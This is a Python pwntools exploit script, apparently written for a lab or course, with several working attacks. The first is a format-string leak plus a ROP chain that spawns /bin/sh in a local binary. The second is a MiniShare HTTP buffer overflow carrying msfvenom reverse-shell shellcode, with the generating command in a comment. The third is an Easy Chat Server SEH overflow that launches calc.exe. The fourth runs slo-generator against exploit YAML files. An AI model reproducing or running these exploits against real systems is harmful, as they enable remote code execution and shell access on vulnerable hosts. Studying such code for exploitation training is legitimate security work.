from pwn import *
import struct
import os
from pathlib import Path
import random
import string
import argparse
import socket 
import sys

#Argument Parsers to recieve info from the user at command time


parser = argparse.ArgumentParser() #create the parser
parser.add_argument("-p", "--payload",default='n',  choices=['n', 'l', 'an'],
                    help="for local app test parameter,numbers,letters, or alphanumeric")		 #for lunning local binary with letters,numbers, or alphanumerics
parser.add_argument("app",default='local',  choices=['local','local2' ,'remote1','remote2'],
                    help="are u running a local or remote app")		# Decides which app to overflow
parser.add_argument("-ip", "--ipaddress",type=str, help="run on remote app ip address")		# recieves IP address from user
parser.add_argument("-s", "--socket",type=int, help="port of Minishare")		#Recieves port of minishare
parser.add_argument("-c",default='--case',  choices=['id','dir', 'ls','whoami'],
                    help="What do you wanna check for")		#Instructs which command to run
args=parser.parse_args()


############



#payload generator, String,numbers, or letters


randStrings=string.ascii_letters + string.digits +string.punctuation		 # creates string of letters, numbers and punctuation marks
numbers=string.digits		 #Creates string of digits
letters=string.ascii_letters	 #creates string of letters


#################################################################################################################################

#Run local binaries created by programmer


def local():
	curdir='./'
	loc = input('Input the location of the test binary: ')
	dest=str.strip(curdir+loc)		 #passes directory to the app to overflow
	print('The app you chose to overflow is:  ',dest)
	elf = ELF(dest)		#creating ELF object with  pwntools
	libc =ELF('/lib/x86_64-linux-gnu/libc.so.6')		 #creating ELF object with pwntools
	io=elf.process()		 # getting process of dest app
	raw_input("Press enter to continue \n" )
	io.recvregex(b':')			#recieves regex of ':'
	info('Relaying the format string now ')
	io.sendline(b'%p,%p,%p')		#sends the pointers to the binaries as inputs
	io.recvline()
	leak = io.recvline().split(b',')		#seperates output by commas
	leaked_stack = int(leak[1],16)		#assigns first leak value as the leaked stack address
	leaked_libc=int(leak[2].strip(),16)		#assigns second leak value as the leaked libc address

	info('Leaked address in stack is: 0x{:08x}'.format(leaked_stack))
	info('Leaked address in libc: 0x{:08x}'.format(leaked_libc))

	start_buf=leaked_stack +264-9


	#decides which data type the payload is


	if args.payload=='n':
		padding=''.join(random.choice(numbers)for i in range(264))
	elif args.payload=='l':
		padding=''.join(random.choice(letters)for i in range(264))
	elif args.payload=='an':
		padding=''.join(random.choice(randStrings)for i in range(264))



	libc.address = leaked_libc - libc.symbols['_IO_2_1_stdin_']		#finds libc address
	info('Base address of libc is : 0x{:08x}'.format(libc.address))

	system=libc.symbols['system']		#finds 'system' symbol in libc symbols
	pop_rdi=0x00000000004013bb 		#saves the pop_rdi address
	bin_sh = next(libc.search(b'/bin/sh'))		#finds address of '/bin/sh'



	#compiles it all into the rop_chain


	rop_chain=[
	pop_rdi,
	bin_sh,
	system
	]

	rop_chain =b''.join([p64(r) for r in rop_chain])		#attach empty string to rop
	info('built rop chain')
	io.recvregex(b':')
	payload=padding.encode()+rop_chain 			#creates payload used to crash system



	info('Sending Exploit')
	io.sendline(payload)		 #sends payload 
	io.interactive()		 #lands in interactive command prompt overflowed


#################################################################################################################################

#Run Minishare remote application


def remote():
	raw_input("Start Minishare and attach to immunity debugger on the victim machine:")
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 		#creates  socket for connection
	s.connect(( args.ipaddress, args.socket)) 		#connects to the port and sockets

	# msfvenom -p windows/shell_reverse_tcp LHOST=victimip LPORT=minishareport –e x86/ shikata_ga_nai -b "\x00\x0a\x0d" -f py 

	#generated shellcode for the local host and ip


	buf =  b""
	buf += b"\xbf\x38\x26\xb2\xb8\xda\xc4\xd9\x74\x24\xf4\x5a\x2b"
	buf += b"\xc9\xb1\x52\x31\x7a\x12\x03\x7a\x12\x83\xd2\xda\x50"
	buf += b"\x4d\xde\xcb\x17\xae\x1e\x0c\x78\x26\xfb\x3d\xb8\x5c"
	buf += b"\x88\x6e\x08\x16\xdc\x82\xe3\x7a\xf4\x11\x81\x52\xfb"
	buf += b"\x92\x2c\x85\x32\x22\x1c\xf5\x55\xa0\x5f\x2a\xb5\x99"
	buf += b"\xaf\x3f\xb4\xde\xd2\xb2\xe4\xb7\x99\x61\x18\xb3\xd4"
	buf += b"\xb9\x93\x8f\xf9\xb9\x40\x47\xfb\xe8\xd7\xd3\xa2\x2a"
	buf += b"\xd6\x30\xdf\x62\xc0\x55\xda\x3d\x7b\xad\x90\xbf\xad"
	buf += b"\xff\x59\x13\x90\xcf\xab\x6d\xd5\xe8\x53\x18\x2f\x0b"
	buf += b"\xe9\x1b\xf4\x71\x35\xa9\xee\xd2\xbe\x09\xca\xe3\x13"
	buf += b"\xcf\x99\xe8\xd8\x9b\xc5\xec\xdf\x48\x7e\x08\x6b\x6f"
	buf += b"\x50\x98\x2f\x54\x74\xc0\xf4\xf5\x2d\xac\x5b\x09\x2d"
	buf += b"\x0f\x03\xaf\x26\xa2\x50\xc2\x65\xab\x95\xef\x95\x2b"
	buf += b"\xb2\x78\xe6\x19\x1d\xd3\x60\x12\xd6\xfd\x77\x55\xcd"
	buf += b"\xba\xe7\xa8\xee\xba\x2e\x6f\xba\xea\x58\x46\xc3\x60"
	buf += b"\x98\x67\x16\x26\xc8\xc7\xc9\x87\xb8\xa7\xb9\x6f\xd2"
	buf += b"\x27\xe5\x90\xdd\xed\x8e\x3b\x24\x66\x71\x13\x26\xde"
	buf += b"\x19\x66\x26\x0f\x86\xef\xc0\x45\x26\xa6\x5b\xf2\xdf"
	buf += b"\xe3\x17\x63\x1f\x3e\x52\xa3\xab\xcd\xa3\x6a\x5c\xbb"
	buf += b"\xb7\x1b\xac\xf6\xe5\x8a\xb3\x2c\x81\x51\x21\xab\x51"
	buf += b"\x1f\x5a\x64\x06\x48\xac\x7d\xc2\x64\x97\xd7\xf0\x74"
	buf += b"\x41\x1f\xb0\xa2\xb2\x9e\x39\x26\x8e\x84\x29\xfe\x0f"
	buf += b"\x81\x1d\xae\x59\x5f\xcb\x08\x30\x11\xa5\xc2\xef\xfb"
	buf += b"\x21\x92\xc3\x3b\x37\x9b\x09\xca\xd7\x2a\xe4\x8b\xe8"
	buf += b"\x83\x60\x1c\x91\xf9\x10\xe3\x48\xba\x21\xae\xd0\xeb"
	buf += b"\xa9\x77\x81\xa9\xb7\x87\x7c\xed\xc1\x0b\x74\x8e\x35"
	buf += b"\x13\xfd\x8b\x72\x93\xee\xe1\xeb\x76\x10\x55\x0b\x53"

	padding=b"\x90"*20		 #added padding 
	
	uniq =b"A" *1787 +b"\xd1\x01\xb3\x75" +padding+buf 		#exploit code with pop address 
	buff= b"GET " + uniq + b" HTTP/1.1\r\n\r\n"		 #exploit code send to the minishare address

	s.send(buff)
	s.close()
###############################################################################################################################

#Run the easy chat sever


def remote2():
	raw_input("Start easy chat server on the victim machine:")
	shellcode = b'\x90' *217 		# padding 
	shellcode+= b'\xEB\x06\x90\x90'		 # jump 8 bytes
	shellcode+=b'\x1E\x07\x01\x10'		# pop, pop, retn instruction location
	shellcode += (b"\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9"
	b"\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56"
	b"\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9"
	b"\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97"
	b"\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64"
	b"\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8"
	b"\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a"
	b"\x1c\x39\xbd")			 #shellcode for executing calc.exe
	shellcode+=b'\x90'*100 			# add a jump of 8 bytes so that the application can jump over where we landed and distinguish the list of hex characters



	buff = b'GET /chat.ghp?username=' + shellcode+ b'&password=test&room=1&sex=1 HTTP/1.1\r\n\r\n' 
	buff += b'Host: 192.168.43.91\r\n\r\n'			  #injecting the shellcode into the address of the chat server


	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)			 #creating the socket connection
	s.connect(( args.ipaddress, args.socket)) 			#connecting to ipaddress and socket 
	s.send(buff)			#sending buffer
	s.close()
	print('Overflow succesful, opening calc.exe')



################################################################################################################################

#Run slo-generator
def local2():
	if args.c=='id':		#if user argument is 'id'
		command='slo-generator migrate -b exploit.yaml'		# runs slo-generator by by using exploit.yaml
		os.system(command)
		print('SLO-GENERATOR OVERFLOWED SUCCESSFUL')
	elif args.c=='whoami':		#if user argument is 'whoami'
		command='slo-generator migrate -b exploit1.yaml'		# runs slo-generator by by using exploit1.yaml
		os.system(command)
		print('SLO-GENERATOR OVERFLOWED SUCCESSFUL')
	elif args.c=='ls':		#if user argument is 'ls'
		command='slo-generator migrate -b exploit2.yaml'		# runs slo-generator by by using exploit1.yaml
		os.system(command)	
		print('SLO-GENERATOR OVERFLOWED SUCCESSFUL')
	elif args.c=='dir':		#if user argument is 'dir'
		command='slo-generator migrate -b exploit3.yaml'		# runs slo-generator by by using exploit1.yaml
		os.system(command)
		print('SLO-GENERATOR OVERFLOWED SUCCESSFUL')



#Decides which process to run


if args.app=='local':
	local()
elif args.app=='remote1':
	remote()
elif args.app=='remote2':
	remote2()
elif args.app=='local2':
	raw_input('You are about to overflow the slo-generator, press return to continue: ')
	local2()

